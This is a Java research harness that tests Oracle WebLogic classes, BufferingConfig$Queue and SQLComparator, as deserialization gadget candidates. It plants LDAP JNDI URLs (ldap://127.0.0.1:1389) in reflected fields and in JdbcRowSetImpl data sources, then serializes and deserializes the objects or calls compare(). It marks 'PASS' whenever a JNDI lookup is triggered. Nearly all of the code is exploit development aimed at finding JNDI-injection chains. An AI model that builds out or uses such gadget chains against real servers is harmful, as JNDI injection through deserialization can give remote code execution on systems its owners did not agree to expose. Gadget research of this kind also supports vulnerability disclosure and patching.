import java.io.*;
import java.lang.reflect.*;
import java.util.*;

public class DeepInspect2 {
    public static void main(String[] args) throws Exception {
        System.out.println("=== Deep Inspection Round 2 ===\n");

        inspectWL6_readObject();
        inspectWL7_stringCols();
    }

    static void inspectWL6_readObject() throws Exception {
        System.out.println("[WL6] BufferingConfig$Queue - readObject decompile + JNDI test");
        Class<?> queueClass = Class.forName("weblogic.wsee.jaxws.buffer.BufferingConfig$Queue");

        // Decompile readObject to understand what it does
        // We can't javap from here, but we can test empirically

        // First, understand the Property class
        Class<?> propClass = Class.forName("weblogic.wsee.jaxws.config.Property");
        System.out.println("  Property class:");
        System.out.println("    Serializable: " + Serializable.class.isAssignableFrom(propClass));
        System.out.println("    Constructors:");
        for (Constructor<?> c : propClass.getDeclaredConstructors()) {
            c.setAccessible(true);
            System.out.println("      " + Arrays.toString(c.getParameterTypes()));
        }
        System.out.println("    Methods:");
        for (Method m : propClass.getDeclaredMethods()) {
            System.out.println("      " + m.getReturnType().getSimpleName() + " " + m.getName()
                + "(" + m.getParameterCount() + ")");
        }
        System.out.println("    Fields:");
        for (Field f : propClass.getDeclaredFields()) {
            f.setAccessible(true);
            System.out.println("      " + f.getType().getSimpleName() + " " + f.getName());
        }

        // Create a Queue with _jndiName Property set to an LDAP URL
        Object queue = createWithoutConstructor(queueClass);

        // Try to create a Property with a string value
        Object jndiProp = null;
        for (Constructor<?> c : propClass.getDeclaredConstructors()) {
            c.setAccessible(true);
            Class<?>[] params = c.getParameterTypes();
            if (params.length == 1 && params[0] == String.class) {
                jndiProp = c.newInstance("ldap://127.0.0.1:1389/WL6_JNDI");
                System.out.println("  Created Property('ldap://...')");
                break;
            } else if (params.length == 0) {
                jndiProp = c.newInstance();
                // Then set the value
                for (Method m : propClass.getDeclaredMethods()) {
                    if (m.getName().equals("setValue") || m.getName().equals("set")) {
                        m.setAccessible(true);
                        m.invoke(jndiProp, "ldap://127.0.0.1:1389/WL6_JNDI");
                        System.out.println("  Created Property, set value via " + m.getName());
                        break;
                    }
                }
                break;
            }
        }

        if (jndiProp == null) {
            // Try createWithoutConstructor and set field directly
            jndiProp = createWithoutConstructor(propClass);
            if (jndiProp != null) {
                for (Field f : propClass.getDeclaredFields()) {
                    f.setAccessible(true);
                    if (f.getType() == String.class || f.getType() == Object.class) {
                        f.set(jndiProp, "ldap://127.0.0.1:1389/WL6_JNDI");
                        System.out.println("  Set Property." + f.getName() + " = ldap://...");
                    }
                }
            }
        }

        // Set _jndiName field on Queue
        if (jndiProp != null) {
            Field jndiField = queueClass.getDeclaredField("_jndiName");
            jndiField.setAccessible(true);
            jndiField.set(queue, jndiProp);
            System.out.println("  Set Queue._jndiName");

            // Test getJndiName()
            Method getJndi = queueClass.getMethod("getJndiName");
            try {
                String result = (String) getJndi.invoke(queue);
                System.out.println("  getJndiName() = " + result);
            } catch (Exception e) {
                System.out.println("  getJndiName() threw: " + e.getCause());
            }

            // Now serialize and deserialize to test readObject
            System.out.println("  Serializing...");
            byte[] data = serialize(queue);
            System.out.println("  Serialized: " + data.length + " bytes");

            System.out.println("  Deserializing (watching for JNDI)...");
            try {
                Object deser = deserialize(data);
                System.out.println("  Deserialized OK: " + deser.getClass().getName());

                // Call getJndiName on deserialized
                try {
                    String jndiName = (String) getJndi.invoke(deser);
                    System.out.println("  Deserialized getJndiName() = " + jndiName);
                    if (jndiName != null && jndiName.contains("ldap://")) {
                        System.out.println("  IMPORTANT: JNDI name survived serialization roundtrip!");
                        System.out.println("  Chain viability: readObject() + later getJndiName() + InitialContext.lookup()");
                    }
                } catch (Exception e) {
                    System.out.println("  Deserialized getJndiName() threw: " + e.getCause());
                }
            } catch (Exception e) {
                String msg = e.toString();
                if (isJndiException(msg)) {
                    System.out.println("  PASS: JNDI triggered during readObject()!");
                } else {
                    System.out.println("  Deser error: " + truncate(msg, 300));
                }
            }
        }
        System.out.println();
    }

    static void inspectWL7_stringCols() throws Exception {
        System.out.println("[WL7] SQLComparator with String columns");
        Class<?> sqlCompClass = Class.forName("weblogic.jdbc.rowset.SQLComparator");

        Object sqlComp = createWithoutConstructor(sqlCompClass);
        Field colsField = sqlCompClass.getDeclaredField("cols");
        colsField.setAccessible(true);

        // cols should be column names (Strings)
        ArrayList<String> cols = new ArrayList<>();
        cols.add("COLUMN1");
        colsField.set(sqlComp, cols);

        @SuppressWarnings("unchecked")
        Comparator<Object> comp = (Comparator<Object>) sqlComp;

        // Test with JdbcRowSetImpl
        Class<?> jrsClass = Class.forName("com.sun.rowset.JdbcRowSetImpl");
        Object jrs1 = jrsClass.getDeclaredConstructor().newInstance();
        jrsClass.getMethod("setDataSourceName", String.class)
            .invoke(jrs1, "ldap://127.0.0.1:1389/WL7_JNDI");

        Object jrs2 = jrsClass.getDeclaredConstructor().newInstance();
        jrsClass.getMethod("setDataSourceName", String.class)
            .invoke(jrs2, "ldap://127.0.0.1:1389/WL7_JNDI2");

        System.out.println("  compare(JdbcRowSetImpl, JdbcRowSetImpl) with cols=['COLUMN1']...");
        try {
            int result = comp.compare(jrs1, jrs2);
            System.out.println("  Returned: " + result);
        } catch (Throwable e) {
            String msg = e.toString();
            System.out.println("  Exception: " + truncate(msg, 300));

            // Check if JNDI was triggered
            if (isJndiException(msg)) {
                System.out.println("  PASS: JNDI triggered via SQLComparator.compare()!");
            }

            // Walk cause chain
            Throwable cause = e.getCause();
            int depth = 0;
            while (cause != null && depth < 8) {
                String causeMsg = cause.toString();
                System.out.println("  Caused by: " + truncate(causeMsg, 200));
                if (isJndiException(causeMsg)) {
                    System.out.println("  PASS: JNDI found in cause chain!");
                }
                cause = cause.getCause();
                depth++;
            }
        }

        // Also test serialization roundtrip of SQLComparator
        System.out.println("\n  Serialization test:");
        try {
            byte[] data = serialize(sqlComp);
            System.out.println("  Serialized: " + data.length + " bytes");
            Object deser = deserialize(data);
            System.out.println("  Deserialized: " + deser.getClass().getName());

            // Check cols survived
            Field colsField2 = deser.getClass().getDeclaredField("cols");
            colsField2.setAccessible(true);
            Object deserCols = colsField2.get(deser);
            System.out.println("  cols survived: " + (deserCols != null ? deserCols.toString() : "null"));
        } catch (Exception e) {
            System.out.println("  Serialization error: " + truncate(e.toString(), 200));
        }
        System.out.println();
    }

    static boolean isJndiException(String msg) {
        if (msg == null) return false;
        return msg.contains("JNDI") || msg.contains("lookup") || msg.contains("InitialContext")
            || msg.contains("NamingException") || msg.contains("ldap://")
            || msg.contains("ConnectException") || msg.contains("CommunicationException")
            || msg.contains("javax.naming") || msg.contains("NameNotFoundException")
            || msg.contains("connect") || msg.contains("Connection refused");
    }

    static Object createWithoutConstructor(Class<?> clazz) {
        try {
            Class<?> rfClass = Class.forName("sun.reflect.ReflectionFactory");
            Method getFactory = rfClass.getMethod("getReflectionFactory");
            Object rf = getFactory.invoke(null);
            Method newCSFA = rfClass.getMethod("newConstructorForSerialization",
                Class.class, Constructor.class);
            Constructor<?> objCtor = Object.class.getDeclaredConstructor();
            Constructor<?> ctor = (Constructor<?>) newCSFA.invoke(rf, clazz, objCtor);
            ctor.setAccessible(true);
            return ctor.newInstance();
        } catch (Exception e) {
            try {
                Constructor<?> c = clazz.getDeclaredConstructor();
                c.setAccessible(true);
                return c.newInstance();
            } catch (Exception e2) { return null; }
        }
    }

    static byte[] serialize(Object obj) throws Exception {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(obj);
        oos.close();
        return bos.toByteArray();
    }

    static Object deserialize(byte[] data) throws Exception {
        ByteArrayInputStream bis = new ByteArrayInputStream(data);
        ObjectInputStream ois = new ObjectInputStream(bis);
        return ois.readObject();
    }

    static String truncate(String s, int max) {
        if (s == null) return "null";
        return s.length() > max ? s.substring(0, max) + "..." : s;
    }
}
